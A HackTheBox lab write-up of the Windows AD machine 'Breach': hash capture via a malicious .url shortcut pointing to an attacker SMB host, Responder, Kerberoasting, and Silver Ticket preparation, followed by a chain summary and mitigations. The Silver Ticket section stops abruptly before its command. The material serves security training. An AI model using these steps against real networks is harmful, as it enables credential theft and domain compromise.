## Executive Summary

Breach is a medium-difficulty Windows Active Directory machine on HackTheBox. The attack chain exploits a misconfigured SMB share, weak account passwords, and a forged Kerberos ticket to achieve full domain compromise through a SQL Server instance.

Initial access begins with SMB guest access to a writable share. A malicious `.url` shortcut file is uploaded to the share, causing Windows to attempt to load its icon from an attacker-controlled SMB server. This triggers an NTLMv2 authentication that Responder captures and Hashcat cracks offline, yielding credentials for `Julia.Wong`.

With valid domain credentials, BloodHound enumeration identifies `svc_mssql` as the only account with a Service Principal Name (SPN), making it Kerberoastable. A TGS ticket for `svc_mssql` is requested and cracked offline to recover the password `Trustno1`. Rather than attempting direct authentication, a **Silver Ticket** is forged using `svc_mssql`'s NT hash — impersonating the domain Administrator against the SQL Server's Kerberos service. This grants `dbo` access to the SQL Server instance via `mssqlclient.py`. The `xp_cmdshell` extended stored procedure is enabled, providing OS command execution as `svc_mssql`. The account holds `SeImpersonatePrivilege`, which GodPotato exploits to escalate to `nt authority\system`.

## NTLM Hash Capture via Malicious .url File

### Attack Overview

A Windows Internet Shortcut file (`.url`) supports an `IconFile` directive that specifies the path to the file's icon. When Windows Explorer renders the directory listing for a share, it automatically resolves icon paths — including UNC paths (`\\server\share\file`). If the icon path points to an attacker-controlled SMB server, Windows attempts to authenticate to that server using the currently logged-in user's NTLMv2 credentials. The attacker's SMB listener (Responder) captures the full NTLMv2 challenge-response hash, which can then be cracked offline.

### Creating the Malicious Shortcut

```bash
kali@kali$ cat > exploit.url << 'EOF'
[InternetShortcut]
URL=asdasdas
WorkingDirectory=hehe
IconFile=\\10.10.14.14\aasd\nc.ico
IconIndex=1
EOF
```

The `URL` and `WorkingDirectory` fields are irrelevant — Windows never follows the URL. The `IconFile` field is the attack vector: its value `\\10.10.14.14\aasd\nc.ico` is a UNC path pointing to the attacker's machine. When any Windows host renders this file in Explorer, it attempts to connect to `\\10.10.14.14\aasd\` via SMB and authenticate with the current user's NTLMv2 credentials.

### Starting Responder

Responder is a rogue authentication server that responds to NetBIOS, LLMNR, and SMB name resolution queries. Here it acts as a rogue SMB server that captures incoming NTLM authentication attempts:

```bash
kali@kali$ sudo responder -I tun0 -v -w -F
```

### Uploading the File

The malicious shortcut is placed in the `transfer` directory where domain users have their profile folders:

```bash
kali@kali$ smbclient //10.129.117.165/Share -N -c "cd transfer; put exploit.url"
```

## Kerberoasting svc_mssql

### What is Kerberoasting?

When a domain account has a **Service Principal Name (SPN)** registered, any authenticated domain user can request a Kerberos **Ticket Granting Service (TGS)** ticket for that account's service. The TGS ticket is encrypted with the service account's NT hash as the key. An attacker who obtains this ticket can attempt to decrypt it offline by brute-forcing the key — recovering the plaintext password without touching the domain controller again. This attack is called Kerberoasting, and it is most effective against service accounts with weak passwords.

`GetUserSPNs.py` queries Active Directory for accounts with SPNs and requests TGS tickets for each:

```bash
kali@kali$ GetUserSPNs.py 'breach.vl/julia.wong:Computer1' -request
```

## Silver Ticket Attack — SQL Server Access

### What is a Silver Ticket?

A **Silver Ticket** is a forged Kerberos service ticket (TGS) that an attacker creates locally, without interacting with the Domain Controller's Key Distribution Centre. Unlike a Golden Ticket (which requires the `krbtgt` hash and grants access to any service), a Silver Ticket requires only the NT hash of the target **service account** — and grants access specifically to that service, as any user.

The ticket is signed and encrypted using the service account's NT hash. The SQL Server trusts this ticket because it decrypts successfully with its own account's key. The Domain Controller is not involved in validating service tickets — the service itself validates the ticket locally. This means the Silver Ticket bypasses KDC-side logging entirely: the KDC never issues the ticket, so there is no AS-REQ or TGS-REQ log entry for the forged access.

### Computing the NT Hash

The NT hash of `Trustno1` is derived using pypykatz:

```bash
kali@kali$ pypykatz crypto nt Trustno1
69596c7aa1e8daee17f8e78870e25a5c
```

### Retrieving the Domain SID

The domain SID is required to construct the Privilege Attribute Certificate (PAC) inside the ticket — it identifies which domain the impersonated user belongs to:

```bash
kali@kali$ rpcclient -U "breach.vl/julia.wong%Computer1" 10.129.117.165 -c "lsaquery"

Domain Sid: S-1-5-21-2330692793-3312915120-706255856
```

### Forging the Silver Ticket

`ticketer.py` constructs a valid TGS for the `MSSQLSvc/breachdc.breach.vl` SPN, impersonating the built-in Administrator account (RID 500):


## Vulnerability Chain Summary

**Step 1 — Guest-accessible writable SMB share:** The `share` SMB share granted `READ,WRITE` to unauthenticated guest sessions. This permitted placing files that would be rendered by Windows Explorer when domain users browsed the share.

**Step 2 — NTLM hash capture via .url icon coercion:** A `.url` shortcut file with an `IconFile` UNC path pointing to the attacker's Responder listener was uploaded to the writable share. When Windows resolved the icon path, it automatically sent `Julia.Wong`'s NTLMv2 hash to the attacker's SMB server. The hash was cracked offline with `rockyou.txt`.

**Step 3 — Kerberoasting with weak service account password:** `svc_mssql` had a registered SPN and a weak password (`Trustno1`), making it trivially Kerberoastable. Any authenticated domain user can request a TGS ticket for an SPN; the ticket is encrypted with the service account's key and crackable offline without any further interaction with the DC.

**Step 4 — Silver Ticket impersonation of SQL Server Administrator:** With `svc_mssql`'s NT hash and the domain SID, a forged Kerberos service ticket was created locally using `ticketer.py`. The ticket embedded the Administrator's RID in its PAC, causing SQL Server to grant `sysadmin`-equivalent access without the KDC issuing the ticket.

**Step 5 — OS command execution via xp_cmdshell:** The `dbo` session enabled `xp_cmdshell`, which executed commands as the `svc_mssql` Windows service account.

**Step 6 — SeImpersonatePrivilege to SYSTEM via GodPotato:** The `svc_mssql` account held `SeImpersonatePrivilege` — a privilege routinely granted to SQL Server service accounts for client impersonation. GodPotato exploited this privilege to capture a SYSTEM-level token via a DCOM/RPC pipe trick and spawn a shell as `nt authority\system`.

## Mitigations

**Disable guest and null session SMB access.** The `share` share permitted unauthenticated write access. All SMB shares should require authentication, and write permissions should be scoped to specific named accounts rather than guest or `Everyone`.

**Disable NTLM authentication where possible.** The NTLMv2 hash capture was only possible because the target machine initiated an NTLM session toward an external host. Restricting outbound NTLM via Group Policy (`Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers`) prevents hash capture even when malicious files are placed on a share. Extended Protection for Authentication (EPA) further hardens inbound NTLM.

**Enforce strong passwords on Kerberoastable service accounts, or migrate to Group Managed Service Accounts (gMSAs).** `svc_mssql` had a password present in `rockyou.txt`. Any account with a registered SPN is a Kerberoasting target — its TGS ticket is obtainable by any domain user. gMSAs automatically rotate to 240-byte random passwords managed by the DC, eliminating offline cracking viability entirely.

**Remove `SeImpersonatePrivilege` from service accounts that do not require it.** SQL Server legitimately requires this privilege when impersonating client connections for database operations. However, it should be verified that the privilege is strictly necessary in the specific deployment. Running SQL Server as a dedicated, low-privilege account and using Windows-managed service accounts reduces the blast radius of a SQL Server compromise.

**Audit Silver Ticket activity with Kerberos event logging.** Silver Ticket authentication events do not generate AS-REQ or TGS-REQ entries at the Domain Controller (the ticket is never presented to the KDC). However, service-side Event ID 4624 logon events with logon type 3 and an unusually old ticket issuance time are indicators. Enforcing `Validate KDC PAC signature` (available in Windows Server 2022 and later) causes services to request PAC validation from the DC, closing the Silver Ticket attack surface.
